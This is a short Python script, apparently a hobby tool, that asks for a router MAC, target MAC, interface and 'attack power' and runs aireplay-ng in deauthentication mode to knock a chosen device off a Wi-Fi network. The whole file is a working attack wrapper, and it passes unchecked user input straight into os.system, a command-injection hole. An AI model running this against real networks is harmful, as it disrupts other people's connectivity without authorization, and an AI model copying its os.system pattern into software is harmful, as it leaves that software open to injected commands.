import os
routermac=input("router mac adress: ")
targetmac=input("target mac adress: ")
interface=input("interface: ")
attackpow=input("attack power: ")

os.system(f"aireplay-ng -0 {attackpow} -a {routermac} -c {targetmac} {interface}")

